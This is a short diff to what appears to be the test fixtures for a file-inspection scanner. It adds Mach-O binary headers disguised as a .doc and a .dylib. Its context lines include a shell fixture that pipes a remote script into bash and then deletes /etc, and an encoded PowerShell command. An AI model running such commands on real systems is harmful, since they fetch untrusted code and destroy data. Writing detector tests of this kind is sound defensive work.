@@ -36,6 +36,8 @@ INSPECT_CASES = {
     "links.xlsx": _zip({"xl/workbook.xml": b"<w/>", "xl/externalLinks/externalLink1.xml": b"<l/>"}),
     "invoice.pdf": b"\x7fELF\x02\x01\x01" + bytes(40),
     "fat.pdf": b"\xcf\xfa\xed\xfe\x07\x00\x00\x01" + bytes(24),
+    "universal.doc": b"\xca\xfe\xba\xbe\x00\x00\x00\x02" + bytes(24),
+    "libx.dylib": b"\xcf\xfa\xed\xfe\x07\x00\x00\x01" + bytes(24),
     "install.sh": b"#!/bin/sh\ncurl -fsSL https://example.invalid/i.sh | bash\nrm -rf /etc\n",
     "run.ps1": b"powershell.exe -enc SQBFAFgA\n",
     "notes.txt": b"plain ascii notes\nline two\n",
